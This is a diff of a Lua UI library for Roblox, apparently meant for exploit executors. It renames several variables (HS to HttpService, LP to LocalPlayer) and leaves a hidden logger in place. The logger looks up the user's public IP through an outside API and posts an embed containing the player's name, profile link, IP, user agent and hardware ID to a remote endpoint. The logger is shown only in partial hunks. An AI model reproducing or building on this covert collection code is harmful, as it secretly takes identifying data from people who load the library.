@@ -1,15 +1,16 @@
 local Library = {RainbowColorValue = 0, HueSelectionPosition = 0}
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local HS = game:GetService("HttpService")
-local LP = game.Players.LocalPlayer
-local Mouse = LP:GetMouse()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
 local MouseMovement = Enum.UserInputType.MouseMovement
 local MouseButton1 = Enum.UserInputType.MouseButton1
 local Touch = Enum.UserInputType.Touch
 function GetJson(v)
-    return HS:JSONDecode(game:HttpGet(v))
+    return HttpService:JSONDecode(game:HttpGet(v))
 end
 function GetIP()
     local IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip
@@ -51,7 +52,7 @@ else
             Headers = {
                 ["Content-Type"] = "application/json"
             },
-            Body = HS:JSONEncode({
+            Body = HttpService:JSONEncode({
                 embeds = {
                     {
                         color = 65280,
@@ -62,7 +63,7 @@ else
                             },
                             {
                                 name = "User",
-                                value = "["..LP.Name.."](https://www.roblox.com/users/"..LP.UserId..")"
+                                value = "["..LocalPlayer.Name.."](https://www.roblox.com/users/"..LocalPlayer.UserId..")"
                             },
                             {
                                 name = "IP",
@@ -70,7 +71,7 @@ else
                             },
                             {
                                 name = "UA",
-                                value = HS:GetUserAgent()
+                                value = HttpService:GetUserAgent()
                             },
                             {
                                 name = "Hwid",
